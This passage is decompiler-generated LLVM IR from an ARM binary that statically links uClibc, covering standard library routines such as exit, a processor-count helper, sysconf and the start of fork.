  store i32 %v1_1328c, i32* %r4.global-to-local, align 4
  br i1 %v3_13280, label %dec_label_pc_13294, label %dec_label_pc_132ac

dec_label_pc_13294:                               ; preds = %bb67, %.thread39
  %v1_1328c44 = phi i32 [ %v1_1328c40, %.thread39 ], [ %v1_1328c, %bb67 ]
  %v4_1329c2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_13294 = load i32, i32* %sl.global-to-local, align 4
  %v3_13294 = icmp uge i32 %v3_132a4, %v1_13294
  %v9_13294 = icmp eq i32 %v3_132a4, %v1_13294
  %v2_13298 = xor i1 %v3_13294, true
  %v3_13298 = or i1 %v9_13294, %v2_13298
  br i1 %v3_13298, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_13294
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_13294, %bb68
  %v4_1329c = phi i32 [ %v4_1329c2443, %dec_label_pc_13294 ], [ 0, %bb68 ]
  %v2_1329c = xor i1 %v9_13294, true
  %v3_1329c = and i1 %v3_13294, %v2_1329c
  br i1 %v3_1329c, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_1329c = urem i32 %v4_1329c, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_132a0 = phi i32 [ %v5_1329c, %bb70 ], [ %v4_1329c, %bb69 ]
  %v2_132a0 = icmp eq i32 %v0_132a0, 0
  br i1 %v2_132a0, label %bb71, label %dec_label_pc_132ac

bb71:                                             ; preds = %thread-pre-split
  %v4_132a4 = mul i32 %v0_13280, %v1_13278
  %v5_132a4 = add i32 %v4_132a4, %v3_132a4
  store i32 %v5_132a4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1324c

dec_label_pc_132ac:                               ; preds = %bb67, %thread-pre-split
  %v0_132b4 = call i32 @__aeabi_read_tp()
  %v0_132b8 = load i32, i32* %r7.global-to-local, align 4
  %v2_132b8 = and i32 %v0_1317c, %v0_132b8
  store i32 %v2_132b8, i32* %r7.global-to-local, align 4
  %v0_132bc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_132bc, i32* %ip.global-to-local, align 4
  %v3_132c0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_132c0 = sext i16 %v3_132c0 to i32
  %v3_132c8 = add i32 %v4_132c0, %v0_132b4
  %v4_132c8 = inttoptr i32 %v3_132c8 to i32*
  store i32 34, i32* %v4_132c8, align 4
  %v0_1324c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1324c

dec_label_pc_132d0.loopexit:                      ; preds = %bb66
  %v0_132d0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_132d0

dec_label_pc_132d0:                               ; preds = %.thread, %dec_label_pc_132d0.loopexit
  %v1_132d4 = phi i32 [ %v1_132d427, %dec_label_pc_132d0.loopexit ], [ %v1_132d429, %.thread ]
  %v2_132d4 = phi i32 [ %v0_132d0.pre, %dec_label_pc_132d0.loopexit ], [ %v0_13170, %.thread ]
  %v2_132d0 = icmp eq i32 %v2_132d4, 0
  br i1 %v2_132d0, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_132d0
  %v3_132d4 = inttoptr i32 %v2_132d4 to i32*
  store i32 %v1_132d4, i32* %v3_132d4, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_132d0, %bb72
  %v0_132dc = load i32, i32* %r7.global-to-local, align 4
  %v2_132dc = icmp eq i32 %v0_132dc, 0
  %. = select i1 %v2_132dc, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_132e8 = icmp eq i32 %v0_1317c, 0
  %v0_13314.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_132e8, label %dec_label_pc_1330c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_13314.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_132f4, label %dec_label_pc_1330c

dec_label_pc_132f4:                               ; preds = %bb76
  %v0_132f8 = call i32 @__aeabi_read_tp()
  %v3_132fc = load i16, i16* @global_var_21a38.351, align 2
  %v4_132fc = sext i16 %v3_132fc to i32
  %v3_13304 = add i32 %v4_132fc, %v0_132f8
  %v4_13304 = inttoptr i32 %v3_13304 to i32*
  store i32 34, i32* %v4_13304, align 4
  %v0_13308 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13308, i32* %ip.global-to-local, align 4
  %v0_1330c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1330c

dec_label_pc_1330c:                               ; preds = %bb76, %bb73, %dec_label_pc_132f4
  %v0_13314.pre = phi i32 [ %v0_13314.pre.pre, %bb76 ], [ %v0_13308, %dec_label_pc_132f4 ], [ %v0_13314.pre.pre, %bb73 ]
  %v0_1330c = phi i32 [ %v0_132dc, %bb76 ], [ %v0_1330c.pre, %dec_label_pc_132f4 ], [ %v0_132dc, %bb73 ]
  %v2_1330c = icmp eq i32 %v0_1330c, 0
  br i1 %v2_1330c, label %dec_label_pc_1330c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_1330c
  %v2_13310 = sub i32 0, %v0_13314.pre
  store i32 %v2_13310, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1330c._crit_edge

dec_label_pc_1330c._crit_edge:                    ; preds = %dec_label_pc_1330c, %bb77
  %v0_13314 = phi i32 [ %v2_13310, %bb77 ], [ %v0_13314.pre, %dec_label_pc_1330c ]
  ret i32 %v0_13314

; uselistorder directives
  uselistorder i32 %v0_13314.pre, { 1, 0 }
  uselistorder i32 %v0_13314.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_1329c, { 1, 0 }
  uselistorder i1 %v3_13294, { 1, 0 }
  uselistorder i32 %v1_13294, { 1, 0 }
  uselistorder i32 %v5_13274, { 1, 0 }
  uselistorder i32 %v1_13260, { 1, 0 }
  uselistorder i32 %v1_13258, { 2, 0, 1 }
  uselistorder i32 %v0_1328c, { 1, 0, 2 }
  uselistorder i32 %v0_1324c, { 1, 0 }
  uselistorder i32 %v3_131fc, { 1, 0 }
  uselistorder i32 %v1_131f0, { 1, 0, 2 }
  uselistorder i32 %v0_131e4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_131c0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1317c, { 1, 0 }
  uselistorder i32 %v0_13178, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13174, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 5, 3, 6 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1330c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1330c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_132d0, { 1, 0 }
  uselistorder label %dec_label_pc_132ac, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13250, { 1, 0 }
  uselistorder label %dec_label_pc_1324c, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_131c4, { 1, 0 }
  uselistorder label %dec_label_pc_131c0, { 1, 0 }
  uselistorder label %dec_label_pc_13188, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r5, align 4
  %v4_13340 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 140) to i32*), align 4
  store i32 %v4_13340, i32* @r4, align 4
  %v2_13348 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_13360 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13360)
  %v0_13374 = load i32, i32* @r5, align 4
  %v2_13374 = add i32 %v0_13374, 16
  %v3_13374 = inttoptr i32 %v2_13374 to i32*
  %v4_13374 = load i32, i32* %v3_13374, align 4
  call void @__pseudo_branch(i32 %v4_13374)
  %v0_13384 = load i32, i32* @r5, align 4
  %v2_13384 = add i32 %v0_13384, 636
  %v3_13384 = inttoptr i32 %v2_13384 to i32*
  %v4_13384 = load i32, i32* %v3_13384, align 4
  %v2_1338c = icmp eq i32 %v4_13384, 0
  br i1 %v2_1338c, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_13398 = xor i1 %v2_1338c, true
  call void @__pseudo_cond_branch(i1 %v2_13398, i32 %v4_13384)
  store i32 %v2_13348, i32* @r0, align 4
  %v0_133a8 = load i32, i32* @r5, align 4
  %v2_133a8 = add i32 %v0_133a8, 44
  %v3_133a8 = inttoptr i32 %v2_133a8 to i32*
  %v4_133a8 = load i32, i32* %v3_133a8, align 4
  call void @__pseudo_branch(i32 %v4_133a8)
  %v0_133b4 = call i32 @__GI___uClibc_fini()
  %v0_133bc = load i32, i32* @r5, align 4
  %v2_133bc = add i32 %v0_133bc, -47788
  %v2_133c4 = icmp eq i32 %v2_133bc, 0
  br i1 %v2_133c4, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_133cc = xor i1 %v2_133c4, true
  call void @__pseudo_cond_branch(i1 %v2_133cc, i32 %v2_133bc)
  %v0_133d0 = load i32, i32* @r6, align 4
  %v1_133d4 = call i32 @__GI__exit(i32 %v0_133d0)
  %v0_133d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_133d8, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_133f0 = phi i32 [ %v1_133d4, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_133f0

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 -34012), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_13418 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 -34012))
  store i32 %v1_13418, i32* @r6, align 4
  %v2_1341c = icmp eq i32 %v1_13418, 0
  br i1 %v2_1341c, label %dec_label_pc_1349c, label %dec_label_pc_13424

dec_label_pc_13424:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_1342c = load i32, i32* @r4, align 4
  %v2_1342c = add i32 %v0_1342c, -34000
  store i32 %v2_1342c, i32* @r8, align 4
  %v2_13430 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13430, i32* @r7, align 4
  br label %bb18

dec_label_pc_13438:                               ; preds = %bb18
  %v3_13438 = load i32, i32* %stack_var_-36, align 4
  %v1_1343c = inttoptr i32 %v3_13438 to i32*
  %v2_1343c = load i32, i32* %v1_1343c, align 4
  %v1_13440 = inttoptr i32 %v2_1343c to i8*
  %v2_13440 = load i8, i8* %v1_13440, align 1
  %v7_13444 = icmp eq i8 %v2_13440, 99
  br i1 %v7_13444, label %dec_label_pc_1344c, label %.backedge3

dec_label_pc_1344c:                               ; preds = %dec_label_pc_13438
  %v1_1344c = add i32 %v2_1343c, 1
  %v2_1344c = inttoptr i32 %v1_1344c to i8*
  %v3_1344c = load i8, i8* %v2_1344c, align 1
  %v7_13450 = icmp eq i8 %v3_1344c, 112
  br i1 %v7_13450, label %dec_label_pc_13458, label %.backedge3

dec_label_pc_13458:                               ; preds = %dec_label_pc_1344c
  %v1_13458 = add i32 %v2_1343c, 2
  %v2_13458 = inttoptr i32 %v1_13458 to i8*
  %v3_13458 = load i8, i8* %v2_13458, align 1
  %v7_1345c = icmp eq i8 %v3_13458, 117
  br i1 %v7_1345c, label %dec_label_pc_13464, label %.backedge3

dec_label_pc_13464:                               ; preds = %dec_label_pc_13458
  %v1_13464 = add i32 %v2_1343c, 3
  %v2_13464 = inttoptr i32 %v1_13464 to i8*
  %v3_13464 = load i8, i8* %v2_13464, align 1
  %v4_13464 = zext i8 %v3_13464 to i32
  %v0_13468 = load i32, i32* @r4, align 4
  %v1_13468 = load i32, i32* @sl, align 4
  %v2_13468 = add i32 %v1_13468, %v0_13468
  %v3_13468 = inttoptr i32 %v2_13468 to i32*
  %v4_13468 = load i32, i32* %v3_13468, align 4
  %v2_1346c = mul nuw nsw i32 %v4_13464, 2
  %v2_13470 = add i32 %v4_13468, %v2_1346c
  %v3_13470 = inttoptr i32 %v2_13470 to i16*
  %v4_13470 = load i16, i16* %v3_13470, align 2
  %v1_13474 = and i16 %v4_13470, 8
  %v2_13474 = icmp eq i16 %v1_13474, 0
  br i1 %v2_13474, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_13464
  %v1_13478 = load i32, i32* @r5, align 4
  %v2_13478 = add i32 %v1_13478, 1
  store i32 %v2_13478, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_13464, %dec_label_pc_13438, %dec_label_pc_1344c, %dec_label_pc_13458
  %v0_1347c.pre = load i32, i32* @r6, align 4
  %v0_13488.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_13424
  %v0_13488 = phi i32 [ %v0_13488.pre, %.backedge3 ], [ %v2_1342c, %dec_label_pc_13424 ]
  %v0_1347c = phi i32 [ %v0_1347c.pre, %.backedge3 ], [ %v1_13418, %dec_label_pc_13424 ]
  %v4_1348c = inttoptr i32 %v0_1347c to i32*
  %v5_1348c = call i32 @__GI_config_read(i32* %v4_1348c, i32 %v2_13430, i32 258, i32 %v0_13488)
  %v2_13490 = icmp eq i32 %v5_1348c, 0
  br i1 %v2_13490, label %dec_label_pc_13500, label %dec_label_pc_13438

dec_label_pc_1349c:                               ; preds = %entry
  %v0_134a0 = load i32, i32* @r4, align 4
  %v2_134a0 = add i32 %v0_134a0, -33996
  store i32 %v2_134a0, i32* @r0, align 4
  %v1_134a4 = call i32 @__GI_config_open(i32 %v2_134a0)
  store i32 %v1_134a4, i32* @r6, align 4
  %v2_134a8 = icmp eq i32 %v1_134a4, 0
  br i1 %v2_134a8, label %bb19, label %dec_label_pc_134b4

bb19:                                             ; preds = %dec_label_pc_1349c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13500

dec_label_pc_134b4:                               ; preds = %dec_label_pc_1349c
  %v0_134b8 = load i32, i32* @r4, align 4
  %v2_134b8 = add i32 %v0_134b8, -33980
  store i32 %v2_134b8, i32* @r8, align 4
  %v2_134c0 = add i32 %v0_134b8, -33944
  store i32 %v2_134c0, i32* @r7, align 4
  %v2_134c4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_134c4, i32* @r4, align 4
  br label %bb21

dec_label_pc_134cc:                               ; preds = %bb21
  %v0_134f8 = load i32, i32* @r8, align 4
  %v3_134cc = load i32, i32* %stack_var_-36, align 4
  %v1_134d0 = inttoptr i32 %v3_134cc to i32*
  %v2_134d0 = load i32, i32* %v1_134d0, align 4
  store i32 %v2_134d0, i32* @r1, align 4
  %v2_134d4 = inttoptr i32 %v0_134f8 to i8*
  %v3_134d4 = call i32 @__GI_strcoll(i8* %v2_134d4, i32 %v2_134d0)
  %v2_134d8 = icmp eq i32 %v3_134d4, 0
  br i1 %v2_134d8, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_134cc
  %v1_134dc = load i32, i32* @r5, align 4
  %v2_134dc = add i32 %v1_134dc, 1
  store i32 %v2_134dc, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_134cc
  %v0_134e8.pre = load i32, i32* @r7, align 4
  %v0_134ec.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_134b4
  %v0_134ec = phi i32 [ %v0_134ec.pre, %.backedge ], [ %v1_134a4, %dec_label_pc_134b4 ]
  %v0_134e8 = phi i32 [ %v0_134e8.pre, %.backedge ], [ %v2_134c0, %dec_label_pc_134b4 ]
  %v4_134f0 = inttoptr i32 %v0_134ec to i32*
  %v5_134f0 = call i32 @__GI_config_read(i32* %v4_134f0, i32 %v2_134c4, i32 459266, i32 %v0_134e8)
  %v2_134f4 = icmp eq i32 %v5_134f0, 0
  br i1 %v2_134f4, label %dec_label_pc_13500, label %dec_label_pc_134cc

dec_label_pc_13500:                               ; preds = %bb18, %bb21, %bb19
  %v0_13500 = load i32, i32* @r6, align 4
  %v1_13504 = inttoptr i32 %v0_13500 to i32*
  %v2_13504 = call i32 @__GI_config_close(i32* %v1_13504)
  %v0_13508 = load i32, i32* @r5, align 4
  %v2_13508 = icmp eq i32 %v0_13508, 0
  %.v0_13508 = select i1 %v2_13508, i32 1, i32 %v0_13508
  ret i32 %.v0_13508

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_13500, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_13934

bb:                                               ; preds = %entry
  %v7_13558 = mul i32 %arg1, 4
  %v8_13558 = add i32 %v7_13558, ptrtoint (i32* @global_var_13560.500 to i32)
  call void @__pseudo_branch(i32 %v8_13558)
  br label %dec_label_pc_13934

dec_label_pc_13934:                               ; preds = %bb, %entry
  %v0_13938 = call i32 @__aeabi_read_tp()
  %v3_1393c = load i16, i16* @global_var_21a38.351, align 2
  %v4_1393c = sext i16 %v3_1393c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13948 = add i32 %v4_1393c, %v0_13938
  %v4_13948 = inttoptr i32 %v3_13948 to i32*
  store i32 22, i32* %v4_13948, align 4
  %v0_13b2c = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_13b2c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 12796, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r8.global-to-local, align 4
  %v4_13c5816 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 12796) to i32*), align 4
  store i32 %v4_13c5816, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c5c18 = icmp eq i32 %v4_13c5816, 0
  br i1 %v2_13c5c18, label %dec_label_pc_13c64, label %dec_label_pc_13b88

dec_label_pc_13b88:                               ; preds = %entry, %dec_label_pc_13c58.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_13b94 = load i32, i32* %r7.global-to-local, align 4
  %v1_13b94 = add i32 %v0_13b94, 20
  %v2_13b94 = inttoptr i32 %v1_13b94 to i32*
  %v3_13b94 = load i32, i32* %v2_13b94, align 4
  store i32 %v3_13b94, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13b98 = icmp eq i32 %v3_13b94, 0
  store i32 %v3_13b94, i32* %r4.global-to-local, align 4
  br i1 %v2_13b98, label %dec_label_pc_13c58.backedge, label %dec_label_pc_13ba8

dec_label_pc_13c58.backedge:                      ; preds = %dec_label_pc_13b88, %dec_label_pc_13bd4
  %v0_13c58 = load i32, i32* %r8.global-to-local, align 4
  %v1_13c58 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c58 = add i32 %v1_13c58, %v0_13c58
  %v3_13c58 = inttoptr i32 %v2_13c58 to i32*
  %v4_13c58 = load i32, i32* %v3_13c58, align 4
  store i32 %v4_13c58, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c5c = icmp eq i32 %v4_13c58, 0
  br i1 %v2_13c5c, label %dec_label_pc_13c64, label %dec_label_pc_13b88

dec_label_pc_13ba8:                               ; preds = %dec_label_pc_13b88
  %v0_13ba8 = load i32, i32* %r8.global-to-local, align 4
  %v1_13ba8 = load i32, i32* %r5.global-to-local, align 4
  %v2_13ba8 = add i32 %v1_13ba8, %v0_13ba8
  %v3_13ba8 = inttoptr i32 %v2_13ba8 to i32*
  %v4_13ba8 = load i32, i32* %v3_13ba8, align 4
  %v1_13bac = add i32 %v4_13ba8, 20
  store i32 %v1_13bac, i32* %r2.global-to-local, align 4
  %v1_13bb0132 = inttoptr i32 %v1_13bac to i32*
  %v2_13bb0133 = load i32, i32* %v1_13bb0132, align 4
  store i32 %v2_13bb0133, i32* %r3.global-to-local, align 4
  %v3_13bb4135 = icmp uge i32 %v2_13bb0133, %v3_13b94
  store i1 %v3_13bb4135, i1* %cpsr_c.global-to-local, align 1
  %v9_13bb4141 = icmp eq i32 %v2_13bb0133, %v3_13b94
  br i1 %v9_13bb4141, label %dec_label_pc_13bbc, label %dec_label_pc_13bd4

dec_label_pc_13bbc:                               ; preds = %dec_label_pc_13ba8, %dec_label_pc_13bbc.dec_label_pc_13bb0_crit_edge
  %v0_13bbc142 = phi i32 [ %v1_13bb4.pre, %dec_label_pc_13bbc.dec_label_pc_13bb0_crit_edge ], [ %v3_13b94, %dec_label_pc_13ba8 ]
  store i32 %v0_13bbc142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13bcc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13bcc, label %dec_label_pc_13bd0, label %dec_label_pc_13bbc.dec_label_pc_13bb0_crit_edge

dec_label_pc_13bbc.dec_label_pc_13bb0_crit_edge:  ; preds = %dec_label_pc_13bbc
  %v0_13bb0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13bb4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13bb0 = inttoptr i32 %v0_13bb0.pre to i32*
  %v2_13bb0 = load i32, i32* %v1_13bb0, align 4
  store i32 %v2_13bb0, i32* %r3.global-to-local, align 4
  %v3_13bb4 = icmp uge i32 %v2_13bb0, %v1_13bb4.pre
  store i1 %v3_13bb4, i1* %cpsr_c.global-to-local, align 1
  %v9_13bb4 = icmp eq i32 %v2_13bb0, %v1_13bb4.pre
  br i1 %v9_13bb4, label %dec_label_pc_13bbc, label %dec_label_pc_13bd4

dec_label_pc_13bd0:                               ; preds = %dec_label_pc_13bbc
  %v0_13bd0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13bd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13bd4

dec_label_pc_13bd4:                               ; preds = %dec_label_pc_13ba8, %dec_label_pc_13bbc.dec_label_pc_13bb0_crit_edge, %dec_label_pc_13bd0
  %v0_13bd4 = phi i32 [ %v0_13bd0, %dec_label_pc_13bd0 ], [ %v2_13bb0133, %dec_label_pc_13ba8 ], [ %v2_13bb0, %dec_label_pc_13bbc.dec_label_pc_13bb0_crit_edge ]
  %v1_13bd4 = phi i32 [ %v0_13bd0, %dec_label_pc_13bd0 ], [ %v3_13b94, %dec_label_pc_13ba8 ], [ %v1_13bb4.pre, %dec_label_pc_13bbc.dec_label_pc_13bb0_crit_edge ]
  %v3_13bd4 = icmp uge i32 %v0_13bd4, %v1_13bd4
  store i1 %v3_13bd4, i1* %cpsr_c.global-to-local, align 1
  %v9_13bd4 = icmp eq i32 %v0_13bd4, %v1_13bd4
  br i1 %v9_13bd4, label %dec_label_pc_13bdc, label %dec_label_pc_13c58.backedge

dec_label_pc_13bdc:                               ; preds = %dec_label_pc_13bd4
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_13bf0 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_13be0

dec_label_pc_13be0:                               ; preds = %dec_label_pc_13c48, %dec_label_pc_13bdc
  %v0_13be0 = load i32, i32* %r7.global-to-local, align 4
  %v1_13be0 = add i32 %v0_13be0, 4
  %v2_13be0 = inttoptr i32 %v1_13be0 to i32*
  %v3_13be0 = load i32, i32* %v2_13be0, align 4
  store i32 %v3_13be0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13be4 = icmp eq i32 %v3_13be0, 0
  br i1 %v2_13be4, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_13be0
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_13be0, %bb
  %v2_13bec = xor i1 %v2_13be4, true
  call void @__pseudo_cond_branch(i1 %v2_13bec, i32 %v3_13be0)
  %v0_13bf4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13bf4, i32* %stack_var_-88, align 4
  %v1_13bf8 = inttoptr i32 %v0_13bf4 to i32*
  %v2_13bf8 = load i32, i32* %v1_13bf8, align 4
  store i32 %v2_13bf8, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13bfc = icmp eq i32 %v2_13bf8, 0
  store i32 %v2_13bf0, i32* %r5.global-to-local, align 4
  br i1 %v2_13bfc, label %dec_label_pc_13c68.loopexit, label %dec_label_pc_13c10

dec_label_pc_13c10:                               ; preds = %bb72
  %v1_13c10 = add i32 %v2_13bf8, 20
  store i32 %v1_13c10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13c14

dec_label_pc_13c14:                               ; preds = %dec_label_pc_13c48.dec_label_pc_13c14_crit_edge, %dec_label_pc_13c10
  %v0_13c18 = phi i32 [ %v0_13c18.pre, %dec_label_pc_13c48.dec_label_pc_13c14_crit_edge ], [ %v1_13c10, %dec_label_pc_13c10 ]
  %v0_13c14 = phi i32 [ %v0_13c14.pre, %dec_label_pc_13c48.dec_label_pc_13c14_crit_edge ], [ %v2_13bf8, %dec_label_pc_13c10 ]
  %v1_13c14 = add i32 %v0_13c14, 20
  %v2_13c14 = inttoptr i32 %v1_13c14 to i32*
  %v3_13c14 = load i32, i32* %v2_13c14, align 4
  store i32 %v0_13c18, i32* %r2.global-to-local, align 4
  store i32 %v3_13c14, i32* %r4.global-to-local, align 4
  %v1_13c24119 = inttoptr i32 %v0_13c18 to i32*
  %v2_13c24120 = load i32, i32* %v1_13c24119, align 4
  store i32 %v2_13c24120, i32* %r3.global-to-local, align 4
  %v3_13c28122 = icmp uge i32 %v2_13c24120, %v3_13c14
  store i1 %v3_13c28122, i1* %cpsr_c.global-to-local, align 1
  %v9_13c28128 = icmp eq i32 %v2_13c24120, %v3_13c14
  br i1 %v9_13c28128, label %dec_label_pc_13c30, label %dec_label_pc_13c48

dec_label_pc_13c30:                               ; preds = %dec_label_pc_13c14, %dec_label_pc_13c30.dec_label_pc_13c24_crit_edge
  %v0_13c30129 = phi i32 [ %v1_13c28.pre, %dec_label_pc_13c30.dec_label_pc_13c24_crit_edge ], [ %v3_13c14, %dec_label_pc_13c14 ]
  store i32 %v0_13c30129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13c40 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13c40, label %dec_label_pc_13c44, label %dec_label_pc_13c30.dec_label_pc_13c24_crit_edge

dec_label_pc_13c30.dec_label_pc_13c24_crit_edge:  ; preds = %dec_label_pc_13c30
  %v0_13c24.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13c28.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13c24 = inttoptr i32 %v0_13c24.pre to i32*
  %v2_13c24 = load i32, i32* %v1_13c24, align 4
  store i32 %v2_13c24, i32* %r3.global-to-local, align 4
  %v3_13c28 = icmp uge i32 %v2_13c24, %v1_13c28.pre
  store i1 %v3_13c28, i1* %cpsr_c.global-to-local, align 1
  %v9_13c28 = icmp eq i32 %v2_13c24, %v1_13c28.pre
  br i1 %v9_13c28, label %dec_label_pc_13c30, label %dec_label_pc_13c48

dec_label_pc_13c44:                               ; preds = %dec_label_pc_13c30
  %v0_13c44 = load i32, i32* %r4.global-to-local, align 4
